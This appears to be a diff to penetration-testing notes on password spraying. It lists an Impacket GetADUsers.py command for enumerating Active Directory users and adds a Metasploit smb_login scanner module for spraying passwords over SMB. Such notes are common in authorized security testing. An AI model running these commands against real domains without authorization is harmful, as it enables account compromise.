@@ -17,3 +17,7 @@ Password spray against user list
 
 Grab user list  
 `python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all domain.corp/aduser -dc-ip x.x.x.x`
+
+Metasploit Password Spray SMB
+---------------------------------------------------------------
+`use auxiliary/scanner/smb/smb_login` 
